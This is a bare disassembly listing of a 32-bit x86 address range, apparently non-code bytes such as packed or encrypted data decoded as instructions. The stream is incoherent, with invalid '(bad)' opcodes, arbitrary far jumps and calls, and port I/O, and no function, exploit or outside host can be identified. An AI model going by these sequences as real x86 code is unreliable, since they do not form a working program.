  414e42:	lods   eax,DWORD PTR gs:[esi]
  414e44:	loop   0x414eac
  414e46:	fnsave [ecx+ecx*8]
  414e49:	push   esp
  414e4a:	mov    ecx,0xe0daf2dc
  414e4f:	jecxz  0x414ea1
  414e51:	jge    0x414e20
  414e53:	jmp    0x42f5d828
  414e58:	aam    0x9a
  414e5a:	ins    BYTE PTR es:[edi],dx
  414e5b:	mov    eax,0xd8c896c3
  414e60:	add    ebp,DWORD PTR [edi]
  414e62:	pop    ss
  414e63:	out    dx,eax
  414e64:	fwait
  414e65:	or     esp,DWORD PTR [edi]
  414e67:	push   cs
  414e68:	xlat   BYTE PTR ds:[ebx]
  414e69:	fisttp QWORD PTR [ebx]
  414e6b:	aaa    
  414e6c:	pop    esp
  414e6d:	adc    ebx,DWORD PTR [bx]
  414e70:	retf   0xd423
  414e73:	push   es
  414e74:	mov    edi,0xb5afdfcc
  414e79:	call   0x9361:0x8daceeb3
  414e80:	mov    BYTE PTR [ebx-0x14601cc2],0x9d
  414e87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e88:	aaa    
  414e89:	adc    DWORD PTR [ebp-0x1d3ecaee],0x44
  414e90:	and    al,0x47
  414e92:	mov    al,ds:0xc2776c5e
  414e97:	sbb    DWORD PTR [edx+0x42],0x1
  414e9b:	add    eax,0xbc970e39
  414ea0:	(bad)
  414ea3:	jp     0x414e3e
  414ea5:	push   edi
  414ea6:	cmp    DWORD PTR [eax],0xffffffd9
  414ea9:	iret   
  414eaa:	cmp    ecx,DWORD PTR [edx+0x34]
  414ead:	add    al,bl
  414eaf:	adc    bh,BYTE PTR [ecx+edx*1]
  414eb2:	bound  esp,QWORD PTR [edi+ebx*1-0x18]
  414eb6:	cmp    eax,0xd6568379
  414ebb:	retf   
  414ebc:	cdq    
  414ebd:	test   BYTE PTR [edi+eax*4+0x36],ah
  414ec1:	(bad)  
  414ec3:	mov    bh,0xf6
  414ec5:	push   ebp
  414ec6:	sbb    DWORD PTR [eax-0xc750583],esi
  414ecc:	inc    edx
  414ecd:	scas   al,BYTE PTR es:[edi]
  414ece:	adc    al,0xd6
  414ed0:	in     al,dx
  414ed1:	xchg   BYTE PTR [edi],bl
  414ed3:	jmp    0x414ed7
  414ed5:	mov    ds:0x8af97080,al
  414eda:	mov    dh,0xd3
  414edc:	adc    al,0xee
  414ede:	dec    edi
  414edf:	push   ebx
  414ee0:	fbstp  TBYTE PTR [ecx]
  414ee2:	fwait
  414ee3:	shl    BYTE PTR [edx],1
  414ee5:	(bad)  
  414ee6:	lock loopne 0x414eb3
  414ee9:	push   0xf006497c
  414eee:	and    eax,0xb0c75a9b
  414ef3:	repz and al,0x40
  414ef6:	mov    al,0xf9
  414ef8:	mov    ebp,0xd5174863
  414efd:	les    esi,FWORD PTR [ecx+0x12]
  414f00:	push   ds
  414f01:	fistp  WORD PTR [esi-0x4d99e69]
  414f07:	arpl   cx,cx
  414f09:	mov    ebx,0xb1fa07e4
  414f0e:	push   eax
  414f0f:	pshufw mm7,QWORD PTR [edi-0x4fbf54e6],0xb8
  414f17:	inc    edi
  414f18:	leave  
  414f19:	mov    bl,0xde
  414f1b:	cs cdq 
  414f1d:	adc    DWORD PTR [esi],0xffffffc8
  414f20:	repz rcl BYTE PTR [ebx],cl
  414f23:	pop    ds
  414f24:	cmp    ecx,DWORD PTR [esp+ecx*2]
  414f27:	mov    al,0x8f
  414f29:	sub    al,0x1f
  414f2b:	mov    WORD PTR [eax-0x66fa905f],ds
  414f31:	stc    
  414f32:	data16 mov bl,0xf8
  414f35:	sar    BYTE PTR es:[esi],0x61
  414f39:	repnz sbb DWORD PTR [edi],edx
  414f3c:	inc    edi
  414f3d:	es mov edi,0x1d3244a4
  414f43:	mov    bh,0x84
  414f45:	xor    ah,ah
  414f47:	sub    bl,bl
  414f49:	imul   ebx,eax,0xef637759
  414f4f:	rcl    DWORD PTR [edx-0x4b9c735a],cl
  414f55:	mov    dh,0x1d
  414f57:	aas    
  414f58:	rcr    dh,0xa0
  414f5b:	mov    cl,0x2e
  414f5d:	in     eax,0x3b
  414f5f:	jmp    0x414fa7
  414f61:	dec    ecx
  414f62:	xchg   BYTE PTR [ecx-0x6c319ea0],bh
  414f68:	xchg   esi,eax
  414f69:	xchg   edx,eax
  414f6a:	sub    edi,DWORD PTR [ecx-0x1f]
  414f6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f6e:	lea    ebx,[edx]
  414f70:	lea    esp,[ebp-0x7cf7cdf4]
  414f76:	inc    esi
  414f77:	shl    esi,0x19
  414f7a:	adc    BYTE PTR [edi+eiz*1+0x51],dh
  414f7e:	pop    ebp
  414f7f:	inc    edi
  414f80:	xchg   edx,eax
  414f81:	mov    eax,0xbcb51c30
  414f86:	loopne 0x414fe1
  414f88:	or     eax,0x3da52a02
  414f8d:	mov    ebp,0x953fec57
  414f92:	bound  esi,QWORD PTR [ecx-0x627bbdc7]
  414f98:	(bad)  
  414f9a:	sub    al,0xab
  414f9c:	sub    al,0x18
  414f9e:	test   BYTE PTR [esi],dh
  414fa0:	sbb    dl,0xbc
  414fa3:	mov    bh,0xbe
  414fa5:	xchg   edx,eax
  414fa6:	pop    es
  414fa7:	sbb    BYTE PTR ds:0xe4e5,ah
  414fac:	(bad)
  414fb1:	xor    bh,BYTE PTR [ebx]
  414fb3:	inc    edx
  414fb4:	mov    bh,cl
  414fb6:	scas   al,BYTE PTR es:[edi]
  414fb7:	push   ebx
  414fb8:	push   esp
  414fb9:	mov    eax,ds:0x57d5bc56
  414fbe:	push   eax
  414fbf:	jnp    0x414f9e
  414fc1:	test   eax,0x2ee2810d
  414fc6:	gs jo  0x414fba
  414fc9:	cmp    eax,0x3fb742c4
  414fce:	jns    0x41504a
  414fd0:	jae    0x414f9a
  414fd2:	xor    BYTE PTR [ecx-0x162b1f89],bh
  414fd8:	jl     0x414f86
  414fda:	mov    eax,0xfa57d7a3
  414fdf:	mov    ch,0x1f
  414fe1:	xchg   ebx,eax
  414fe2:	(bad)  
  414fe3:	cmp    DWORD PTR [eax-0x22],edi
  414fe6:	test   eax,0x7a0c4cd
  414feb:	add    al,0x2a
  414fed:	and    esi,DWORD PTR [eax-0x2ae336f9]
  414ff3:	mov    cl,0x5
  414ff5:	iret   
  414ff6:	inc    esi
  414ff7:	rol    BYTE PTR [edx-0xe],cl
  414ffa:	into   
  414ffb:	or     al,0xaf
  414ffd:	cld    
  414ffe:	fdivr  st,st(3)
  415000:	loop   0x414f82
  415002:	jp     0x415041
  415004:	int3   
  415005:	hlt    
  415006:	and    BYTE PTR [edi+ecx*2+0x1e],al
  41500a:	aas    
  41500b:	mov    eax,ds:0xf3f28901
  415010:	dec    esi
  415011:	mov    ecx,0x7a0bb885
  415016:	ja     0x414fd8
  415018:	das    
  415019:	jl     0x41502d
  41501b:	test   esp,esi
  41501d:	das    
  41501e:	push   eax
  41501f:	popf   
  415020:	fisubr DWORD PTR [eax+0x55f70627]
  415026:	in     al,dx
  415027:	push   ecx
  415028:	outs   dx,BYTE PTR ds:[esi]
  415029:	mov    dh,0x57
  41502b:	dec    esi
  41502c:	cli    
  41502d:	fwait
  41502e:	jmp    0x41504b
  415030:	adc    eax,0x6b87cb29
  415035:	fisub  DWORD PTR [eax]
  415037:	out    0x4e,al
  415039:	lds    ebx,FWORD PTR [di+0x4999]
  41503e:	dec    esi
  41503f:	out    0x4d,eax
  415041:	loop   0x41509c
  415043:	sbb    ebp,DWORD PTR [eax]
  415045:	xlat   BYTE PTR ds:[ebx]
  415046:	and    DWORD PTR [ebx+0x65],0xffffffd6
  41504a:	jae    0x41504d
  41504c:	sbb    eax,0xf337070f
  415051:	retf   
  415052:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415053:	retf   0x4c8a
  415056:	cmp    al,0x91
  415058:	cmp    edi,DWORD PTR [ebx]
  41505a:	loop   0x41500d
  41505c:	inc    ebx
  41505d:	sub    ah,BYTE PTR [esi+0x39ed80fc]
  415063:	mov    ds:0x67ae9e83,eax
  415068:	rcr    DWORD PTR [ecx],0xc6
  41506b:	sub    al,0x59
  41506d:	and    ebx,DWORD PTR [eax-0x5f338dc3]
  415073:	ins    BYTE PTR es:[edi],dx
  415074:	pop    ss
  415075:	add    dl,BYTE PTR [ebp+0x22]
  415078:	imul   esp,DWORD PTR [ecx],0x17f4f5cc
  41507e:	das    
  41507f:	jbe    0x415080
  415081:	js     0x415082
  415083:	mov    al,0x6
  415085:	test   eax,0x3a86409b
  41508a:	gs addr16 pop es
  41508d:	imul   esi,DWORD PTR [edx-0x4c],0x22089660
  415094:	fidivr DWORD PTR [edi+0x13]
  415097:	retf   
  415098:	xchg   ecx,eax
  415099:	mov    ecx,DWORD PTR [esi-0x2c]
  41509c:	xchg   ebp,eax
  41509d:	pusha  
  41509e:	xchg   esp,esp
  4150a0:	xor    al,0x6f
  4150a2:	sub    dl,BYTE PTR [edx-0x79f0f1f]
  4150a8:	xor    DWORD PTR [edx+0x27],0x12a22ea9
  4150af:	daa    
  4150b0:	ficomp WORD PTR [edi+0x0]
  4150b3:	sbb    al,0x83
  4150b5:	xchg   esp,eax
  4150b6:	fistp  QWORD PTR [esi]
  4150b8:	jp     0x4150bd
  4150ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4150bb:	inc    esp
  4150bc:	cli    
  4150bd:	pusha  
  4150be:	in     eax,dx
  4150bf:	add    cl,bl
  4150c1:	scas   al,BYTE PTR es:[edi]
  4150c2:	dec    edi
  4150c3:	repz mov eax,DWORD PTR [edi]
  4150c6:	jmp    0xbee4d153
  4150cb:	dec    DWORD PTR [ecx-0x45c90b2d]
  4150d1:	aad    0xb0
  4150d3:	push   ebp
  4150d4:	jle    0x4150ab
  4150d6:	push   0x2f
  4150d8:	pop    eax
  4150d9:	cmc    
  4150da:	push   edi
  4150db:	fisubr DWORD PTR [esi]
  4150dd:	jmp    0xcb7ff9a1
  4150e2:	sbb    ah,BYTE PTR [ebx-0x6d2caab2]
  4150e8:	test   DWORD PTR [ebx+0x78a3caac],ecx
  4150ee:	(bad)  
  4150ef:	jmp    0xc041:0xf6d2baa4
  4150f6:	aaa    
  4150f7:	loope  0x4150ac
  4150f9:	or     ebp,ebp
  4150fb:	dec    esp
  4150fc:	fbld   TBYTE PTR [ebx]
  4150fe:	dec    ebp
  4150ff:	mov    cl,0x1a
  415101:	cwde   
  415102:	cmc    
  415103:	and    al,0xe0
  415105:	push   edi
  415106:	jmp    0x4150dc
  415108:	lock je 0x41512a
  41510b:	jo     0x4150c5
  41510d:	jnp    0x4150c6
  41510f:	stos   BYTE PTR es:[edi],al
  415110:	out    0x58,eax
  415112:	and    eax,0x2d433c4
  415117:	mov    dh,0x29
  415119:	mov    dl,0x83
  41511b:	sub    eax,0x272ea8f0
  415120:	mov    WORD PTR [edx],?
  415122:	sbb    ecx,DWORD PTR [ecx+0x7d]
  415125:	hlt    
  415126:	or     ch,BYTE PTR [edx+eiz*1-0x62d9a7d9]
  41512d:	aaa    
  41512e:	pop    ds
  41512f:	jle    0x415178
  415131:	mov    dl,0xec
  415133:	sub    ebx,DWORD PTR [ebx+0x14]
  415136:	sbb    eax,0x2d8e12dd
  41513b:	call   DWORD PTR [ebp-0x6fe8cd95]
  415141:	rcr    BYTE PTR [ecx+0x1c1b0eb6],0x81
  415148:	xor    eax,0x2e72785f
  41514d:	sub    cl,BYTE PTR [esi+ecx*1]
  415150:	inc    esi
  415151:	les    ecx,FWORD PTR [esi+0x1f990f70]
  415157:	add    DWORD PTR [eax],0x9cd6cdc3
  41515d:	jl     0x41516c
  41515f:	push   cs
  415160:	or     al,0x9a
  415162:	xchg   edx,eax
  415163:	inc    ecx
  415164:	(bad)  
  415165:	bound  edi,QWORD PTR [eax]
  415167:	mov    al,ds:0x62e87d6
  41516c:	push   es
  41516d:	dec    ebx
  41516e:	mov    dh,0xc7
  415170:	int    0x91
  415172:	push   ds
  415173:	out    0xfe,al
  415175:	bound  esp,QWORD PTR [ecx]
  415177:	xor    ebp,DWORD PTR [edx+0x5]
  41517a:	das    
  41517b:	out    dx,al
  41517c:	mov    ch,0x43
  41517e:	mov    ds:0x626d4545,al
  415183:	fldcw  WORD PTR [edi+0x6f96b797]
  415189:	mov    edx,0x96f4cbc2
  41518e:	aam    0x3a
  415190:	cs xchg ebp,eax
  415192:	(bad)  
  415193:	adc    eax,0x6f9b3f01
  415198:	scas   al,BYTE PTR es:[edi]
  415199:	xchg   edx,eax
  41519a:	mov    ebp,0xdeb7aea9
  41519f:	dec    ebx
  4151a0:	repnz (bad) 
  4151a2:	test   al,0x39
  4151a4:	mov    ds:0xcf585d91,al
  4151a9:	pop    ss
  4151aa:	xchg   ebx,eax
  4151ab:	mov    ecx,0xf5aa8040
  4151b0:	fst    DWORD PTR [esi]
  4151b2:	call   0xb29a:0x43239272
  4151b9:	sti    
  4151ba:	fwait
  4151bb:	or     ebp,DWORD PTR [edx+edi*1-0x7e691ef0]
  4151c2:	outs   dx,BYTE PTR ds:[esi]
  4151c3:	bound  ebx,QWORD PTR ds:0x92a40148
  4151c9:	pusha  
  4151ca:	push   ebx
  4151cb:	ss jne 0x415182
  4151ce:	push   es
  4151cf:	repnz dec eax
  4151d1:	inc    ebp
  4151d2:	mov    ebp,0x4de228fe
  4151d7:	lods   eax,DWORD PTR ds:[esi]
  4151d8:	test   al,0x59
  4151da:	gs inc esp
  4151dc:	pusha  
  4151dd:	push   ecx
  4151de:	and    eax,0x910acccf
  4151e3:	into   
  4151e4:	popa   
  4151e5:	retf   0xa5f5
  4151e8:	cmp    eax,0x99dcf058
  4151ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4151ee:	mov    eax,ds:0xcb043dab
  4151f3:	test   al,0x6c
  4151f5:	mov    ah,0x0
  4151f7:	lahf   
  4151f8:	shl    BYTE PTR [esi],cl
  4151fa:	or     ch,dh
  4151fc:	push   ebp
  4151fd:	(bad)  
  4151fe:	jecxz  0x4151dd
  415200:	cld    
  415201:	aas    
  415202:	sub    dh,BYTE PTR [edi+eax*1+0x72]
  415206:	cs push esi
  415208:	mov    cl,0xb7
  41520a:	jbe    0x415236
  41520c:	sub    eax,ecx
  41520e:	mov    bl,0x8d
  415210:	xchg   esp,eax
  415211:	inc    ebx
  415212:	xchg   DWORD PTR [edi+ecx*4],ebp
  415215:	out    dx,al
  415216:	adc    BYTE PTR [ebx+0x48],ch
  415219:	mov    ecx,0x2b21d35b
  41521e:	push   ecx
  41521f:	arpl   WORD PTR [edi],sp
  415221:	sbb    al,0x19
  415223:	out    dx,eax
  415224:	push   DWORD PTR [esi+0x34508aa3]
  41522a:	retf   
  41522b:	mov    ch,0xb6
  41522d:	pop    ss
  41522e:	pop    ds
  41522f:	sub    esp,DWORD PTR [eax+0x5efe5d4a]
  415235:	ins    DWORD PTR es:[edi],dx
  415236:	jp     0x415221
  415238:	aaa    
  415239:	out    dx,al
  41523a:	cmp    al,0x9a
  41523c:	es ins DWORD PTR es:[edi],dx
  41523e:	(bad)  
  41523f:	sub    al,0x8e
  415241:	not    DWORD PTR [eax-0x796b278e]
  415247:	fldenv [eax+0x5c]
  41524a:	lods   eax,DWORD PTR ds:[esi]
  41524b:	mov    bl,0x27
  41524d:	call   0xaa49:0xa0549d8a
  415254:	jmp    0x939a4c19
  415259:	push   cs
  41525a:	cmc    
  41525b:	nop
  41525c:	jmp    0x5269:0x14cba36e
  415263:	sbb    edx,DWORD PTR ds:0x4c853f21
  415269:	xchg   ebx,eax
  41526a:	add    bh,dh
  41526c:	in     eax,dx
  41526d:	xlat   BYTE PTR ds:[ebx]
  41526e:	sbb    ch,BYTE PTR ds:0x19f5917d
  415274:	sbb    esp,eax
  415276:	mov    esp,0x21af8df6
  41527b:	jp     0x4152de
  41527d:	cmp    BYTE PTR [esi-0x41c3d8dc],al
  415283:	push   cs
  415284:	sbb    al,0x81
  415286:	push   0xcd618fd0
  41528b:	inc    eax
  41528c:	ficomp WORD PTR [ebp+0x5ddd6855]
  415292:	in     eax,dx
  415293:	stc    
  415294:	pop    ecx
  415295:	scas   eax,DWORD PTR es:[edi]
  415296:	repz int 0x85
  415299:	ror    DWORD PTR [edx+0x62],0x26
  41529d:	ins    DWORD PTR es:[edi],dx
  41529e:	pop    ebx
  41529f:	lods   al,BYTE PTR ds:[esi]
  4152a0:	daa    
  4152a1:	jne    0x41527e
  4152a3:	add    eax,0xba758b78
  4152a8:	push   ebx
  4152a9:	xor    al,0xc6
  4152ab:	mov    al,ds:0xb1cd813c
  4152b0:	retf   0x1828
  4152b3:	dec    eax
  4152b4:	scas   eax,DWORD PTR es:[edi]
  4152b5:	pop    es
  4152b6:	test   DWORD PTR [esi],edx
  4152b8:	aaa    
  4152b9:	push   edi
  4152ba:	out    dx,al
  4152bb:	outs   dx,BYTE PTR ds:[esi]
  4152bc:	mov    ds:0x96aa7d45,al
  4152c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4152c2:	mov    cl,ah
  4152c4:	jp     0x4152e1
  4152c6:	fidiv  DWORD PTR [ecx-0x14]
  4152c9:	mov    dh,0x3f
  4152cb:	je     0x415318
  4152cd:	lds    esp,FWORD PTR [edi-0x7d876362]
  4152d3:	outs   dx,DWORD PTR ds:[esi]
  4152d4:	out    0x1f,al
  4152d6:	scas   al,BYTE PTR es:[edi]
  4152d7:	dec    eax
  4152d8:	outs   dx,DWORD PTR ds:[esi]
  4152d9:	pop    ebp
  4152da:	jmp    0x415321
  4152dc:	out    dx,al
  4152dd:	or     BYTE PTR [ecx-0x7144ebef],ch
  4152e3:	sub    dl,bl
  4152e5:	sub    eax,0xeac95137
  4152ea:	or     BYTE PTR [ebp+0x6753c4b8],al
  4152f0:	pop    edx
  4152f1:	(bad)  
  4152f3:	loope  0x4152e2
  4152f5:	call   0x3248:0x6e42a76e
  4152fc:	xchg   esi,eax
  4152fd:	ds inc esi
  4152ff:	jb     0x4152f9
  415301:	popa   
  415302:	and    DWORD PTR [ecx-0x5c],edi
  415305:	mov    cl,0xc
  415307:	sar    DWORD PTR [ebx+edx*1],cl
  41530a:	sbb    DWORD PTR [eax+0x78],0x8527b01a
  415311:	xor    al,0x8e
  415313:	cmp    al,0xad
  415315:	(bad)
  415319:	(bad)  
  41531a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41531b:	jg     0x415347
  41531d:	js     0x4152c7
  41531f:	mov    bh,0x5f
  415321:	mov    edx,esi
  415323:	and    DWORD PTR [eax],ebp
  415325:	dec    edi
  415326:	mov    edi,0x5ea8be6b
  41532b:	jg     0x415380
  41532d:	and    eax,0x8018e85f
  415332:	call   0xa04d5405
  415337:	(bad)  
  415338:	ins    DWORD PTR es:[edi],dx
  415339:	push   edx
  41533a:	mov    eax,DWORD PTR [edx]
  41533c:	in     al,0xb3
  41533e:	or     DWORD PTR [ebp-0x5a],eax
  415341:	mov    esp,0x5159ccf4
  415346:	cmp    DWORD PTR [ecx+eiz*4-0xe27d8f7],ecx
  41534d:	lahf   
  41534e:	jnp    0x4153b3
  415350:	mov    edx,0xf650881d
  415355:	call   0xcbf5:0x1643cab8
  41535c:	mov    ebp,0x589d910c
  415361:	scas   eax,DWORD PTR es:[edi]
  415362:	add    ecx,esi
  415364:	gs inc esp
  415366:	cmp    eax,0x8dac7545
  41536b:	pop    ecx
  41536c:	lods   eax,DWORD PTR ds:[esi]
  41536d:	sbb    DWORD PTR es:[edi-0x7],esp
  415371:	xor    eax,0x43dcdc2c
  415376:	sbb    DWORD PTR [eax-0xd7d4f36],ebp
  41537c:	jl     0x415300
  41537e:	xor    eax,0x4713be1e
  415383:	fs jbe 0x4153dd
  415386:	mov    DWORD PTR [edi],esp
  415388:	inc    ebp
  415389:	xchg   esi,eax
  41538a:	xchg   esi,eax
  41538b:	mul    DWORD PTR [edx-0x37]
  41538e:	sub    ch,BYTE PTR [eax+0x28d03299]
  415394:	popf   
  415395:	cld    
  415396:	jp     0x41532f
  415398:	mov    cl,0x43
  41539a:	pop    es
  41539b:	call   0x31e:0x115383c5
  4153a2:	lds    ebx,FWORD PTR [eax]
  4153a4:	mov    al,0xc1
  4153a6:	push   eax
  4153a7:	outs   dx,BYTE PTR ds:[esi]
  4153a8:	adc    DWORD PTR [ecx],0xffffffda
  4153ab:	fild   WORD PTR [ecx+ebp*8+0x6092e420]
  4153b2:	cdq    
  4153b3:	lds    ebx,FWORD PTR [ebx-0x5bee7b68]
  4153b9:	and    esp,DWORD PTR [esi-0x6bf291b8]
  4153bf:	mov    eax,0x1d64ee5b
  4153c4:	pop    esi
  4153c5:	or     ebx,DWORD PTR [esi]
  4153c7:	inc    eax
  4153c8:	(bad)  
  4153c9:	adc    BYTE PTR [ebx],0x7a
  4153cc:	cli    
  4153cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4153ce:	mov    edi,DWORD PTR [eax-0x44]
  4153d1:	hlt    
  4153d2:	push   0xbfa26b74
  4153d7:	imul   edx,DWORD PTR [ecx-0x2086a848],0x2817bcd8
  4153e1:	fdivr  QWORD PTR ds:[ecx-0x5ae85326]
  4153e8:	xor    eax,0xe28d20fd
  4153ed:	enter  0x38fc,0xd4
  4153f1:	push   ss
  4153f2:	fld    DWORD PTR [eax]
  4153f4:	add    edx,DWORD PTR [edx]
  4153f6:	icebp  
  4153f7:	popa   
  4153f8:	test   DWORD PTR [eax],edi
  4153fa:	(bad)  
  4153fb:	lock xchg BYTE PTR [ecx-0x6f51a02],bh
  415402:	add    al,0xa9
  415404:	icebp  
  415405:	mov    ch,0x9b
  415407:	dec    ebp
  415408:	(bad)  
  415409:	std    
  41540a:	xchg   edi,eax
  41540b:	mov    ebx,edi
  41540d:	call   0x97ce:0x562ad70a
  415414:	xchg   ebp,eax
  415415:	or     BYTE PTR [ecx-0x3c],bh
  415418:	pop    esp
  415419:	in     eax,0xb2
  41541b:	or     DWORD PTR [ebx],esp
  41541d:	inc    ecx
  41541e:	pusha  
  41541f:	fidivr WORD PTR [ebp-0x17]
  415422:	nop
  415423:	xor    BYTE PTR cs:[ecx-0x7c],ch
  415427:	pop    es
  415428:	pop    eax
  415429:	jns    0x4153de
  41542b:	popa   
  41542c:	fisub  DWORD PTR [eax-0x1f]
  41542f:	mov    bl,0x79
  415431:	in     al,dx
  415432:	mul    BYTE PTR [ebx+0x33]
  415435:	mov    bl,0x56
  415437:	cmp    BYTE PTR [edi-0x3cfe3633],dl
  41543d:	xor    al,0x5
  41543f:	fcom   DWORD PTR [ebp+0x659438c4]
  415445:	fnstenv [esi+edi*1-0x2c]
  415449:	push   0xf49ebd2e
  41544e:	add    BYTE PTR [ecx],ah
  415450:	out    dx,eax
  415451:	or     al,0x6b
  415453:	dec    edi
  415454:	mov    gs,WORD PTR [ecx-0x2a]
  415457:	fwait
  415458:	lods   al,BYTE PTR ds:[esi]
  415459:	and    edi,DWORD PTR [edx-0x78]
  41545c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41545d:	clc    
  41545e:	and    edx,esp
  415460:	addr16 xchg cl,cl
  415463:	push   edx
  415464:	inc    esp
  415465:	ins    DWORD PTR es:[edi],dx
  415466:	inc    edi
  415467:	mov    eax,ds:0xda915338
  41546c:	sub    DWORD PTR [edi-0x21],0x49b85def
  415473:	popa   
  415474:	aaa    
  415475:	cwde   
  415476:	das    
  415477:	test   BYTE PTR [edx],bh
  415479:	adc    edi,DWORD PTR [ecx-0xfba165]
  41547f:	dec    edi
  415480:	clc    
  415481:	shl    BYTE PTR [esi-0x6cbd13c3],1
  415487:	dec    esp
  415488:	rcr    DWORD PTR [edx+0x1be89629],1
  41548e:	loopne 0x41549a
  415490:	not    DWORD PTR [edi]
  415492:	out    dx,al
  415493:	cmp    BYTE PTR [eax+0x7b0639c7],0x7e
  41549a:	and    BYTE PTR [ebx],0xe7
  41549d:	fld    TBYTE PTR [esi+0x2a]
  4154a0:	mov    dl,BYTE PTR [ebx+ebp*8]
  4154a3:	test   al,0xff
  4154a5:	cli    
  4154a6:	cmp    bl,bl
  4154a8:	mov    esi,0x98c9ffd6
  4154ad:	jp     0x4154e1
  4154af:	or     ebx,DWORD PTR [ecx-0x1f]
  4154b2:	ret    
  4154b3:	push   0x63ec4650
  4154b8:	mov    bh,BYTE PTR [edx+0x3f93098e]
  4154be:	stos   DWORD PTR es:[edi],eax
  4154bf:	js     0x41548b
  4154c1:	call   0x3bc2e77a
  4154c6:	add    edi,DWORD PTR [edi+0x7e]
  4154c9:	adc    al,0x4d
  4154cb:	xchg   ebp,eax
  4154cc:	xor    al,0x95
  4154ce:	cmp    bl,cl
  4154d0:	js     0x41553c
  4154d2:	test   eax,0x14c99db
  4154d7:	xlat   BYTE PTR ds:[ebx]
  4154d8:	mov    ah,BYTE PTR [ecx+0x3]
  4154db:	into   
  4154dc:	sahf   
  4154dd:	jns    0x4154f6
  4154df:	fwait
  4154e0:	mov    cl,ch
  4154e2:	xchg   esi,eax
  4154e3:	je     0x415472
  4154e5:	mov    ds:0xf2edcebc,al
  4154ea:	sbb    BYTE PTR [eax-0x1f9da578],0xcb
  4154f1:	cdq    
  4154f2:	add    cl,BYTE PTR [ecx-0x61]
  4154f5:	(bad)  
  4154f6:	xor    bl,BYTE PTR [ecx+0x3d102cba]
  4154fc:	aaa    
  4154fd:	push   edi
  4154fe:	ins    DWORD PTR es:[edi],dx
  4154ff:	sbb    eax,0x81d7e647
  415504:	mov    ch,BYTE PTR [edi]
  415506:	stos   DWORD PTR es:[edi],eax
  415507:	rol    DWORD PTR [edx],0xfc
  41550a:	or     esi,DWORD PTR [ebp-0x3d]
  41550d:	and    al,0x1e
  41550f:	add    BYTE PTR [edi+0x6e4a0f3a],dh
  415515:	bound  ebp,QWORD PTR [esi+eiz*2]
  415518:	cdq    
  415519:	js     0x4154ff
  41551b:	add    eax,0x5fceb96f
  415520:	shl    BYTE PTR [edi+eax*1+0x34],1
  415524:	push   ebx
  415525:	out    dx,eax
  415526:	pop    es
  415527:	sbb    BYTE PTR [edx+0x7649086f],cl
  41552d:	imul   ebx,DWORD PTR [ecx+0x7d776782],0xa
  415534:	hlt    
  415535:	test   eax,0x382f36f8
  41553a:	inc    esi
  41553b:	adc    BYTE PTR [edx],bh
  41553d:	jns    0x41556c
  41553f:	add    bh,BYTE PTR [ecx+ebx*1+0x4236c5d7]
  415546:	jl     0x415596
  415548:	mov    ah,0x68
  41554a:	xchg   ecx,eax
  41554b:	pusha  
  41554c:	sbb    al,0x5c
  41554e:	ffree  st(7)
  415550:	(bad)  
  415551:	and    ecx,DWORD PTR [edi]
  415553:	cmp    dl,BYTE PTR [eax+0xf87883b]
  415559:	scas   al,BYTE PTR es:[edi]
  41555a:	les    esp,FWORD PTR [esi*2-0x3346a72]
  415561:	into   
  415562:	and    BYTE PTR [ecx],dh
  415564:	fistp  QWORD PTR [eax-0x3ffff6f0]
  41556a:	cli    
  41556b:	popf   
  41556c:	pop    esi
  41556d:	mov    edx,0xfb5897b7
  415572:	bound  edx,QWORD PTR [ebp+0x4e]
  415575:	pop    ss
  415576:	push   edi
  415577:	shl    esp,cl
  415579:	inc    esi
  41557a:	in     al,dx
  41557b:	ds inc ebp
  41557d:	idiv   edi
  41557f:	lods   al,BYTE PTR ds:[esi]
  415580:	iret   
  415581:	(bad)  
  415582:	lea    eax,ds:0xbb843ffd
  415588:	pop    ebp
  415589:	fsubr  st(0),st
  41558b:	pop    ebx
  41558c:	push   esp
  41558d:	fsub   QWORD PTR [esi+0x5df1e92c]
  415593:	leave  
  415594:	sahf   
  415595:	xor    dh,BYTE PTR [ecx+0x47a488d3]
  41559b:	add    eax,0xbd40c371
  4155a0:	mov    ds:0xe04e4fa1,eax
  4155a5:	adc    eax,0xe376321
  4155aa:	mov    si,0xd1b2
  4155ae:	mov    al,BYTE PTR [esi-0x11]
  4155b1:	jns    0x415621
  4155b3:	xchg   DWORD PTR [edi],esi
  4155b5:	inc    ebp
  4155b6:	outs   dx,BYTE PTR ds:[esi]
  4155b7:	pop    ebx
  4155b8:	int    0x5f
  4155ba:	fcom   QWORD PTR [esp+edx*2+0x4eae1f7c]
  4155c1:	out    0xfb,eax
  4155c3:	cli    
  4155c4:	mov    ebx,0xecbcb001
  4155c9:	xchg   BYTE PTR [edx],bl
  4155cb:	sbb    edx,DWORD PTR [edx-0xd]
  4155ce:	test   eax,0x83c00463
  4155d3:	xlat   BYTE PTR ds:[ebx]
  4155d4:	(bad)  
  4155d5:	dec    ebx
  4155d6:	fidiv  DWORD PTR [ecx]
  4155d8:	jnp    0x41560c
  4155da:	addr16 or dl,0xb0
  4155de:	adc    esp,0x52e878be
  4155e4:	(bad)  
  4155e6:	lods   al,BYTE PTR ds:[esi]
  4155e7:	xor    bl,BYTE PTR [edi-0x5b]
  4155ea:	inc    edi
  4155eb:	inc    edx
  4155ec:	and    esi,DWORD PTR [ecx]
  4155ee:	icebp  
  4155ef:	in     al,0xc
  4155f1:	jl     0x4155b8
  4155f3:	add    DWORD PTR ds:0xdf8972fc,esp
  4155f9:	sbb    esp,DWORD PTR [edx]
  4155fb:	push   0x2b5ce255
  415600:	pop    ebx
  415601:	jae    0x415677
  415603:	outs   dx,BYTE PTR ds:[esi]
  415604:	(bad)  
  415605:	mov    al,0x62
  415607:	pop    ebx
  415608:	push   esi
  415609:	add    BYTE PTR [edi-0x18],0xdd
  41560d:	scas   al,BYTE PTR es:[edi]
  41560e:	jp     0x4155b9
  415610:	mov    cl,0x9a
  415612:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415613:	pop    esi
  415614:	ret    
  415615:	in     eax,0x5e
  415617:	lods   eax,DWORD PTR ds:[esi]
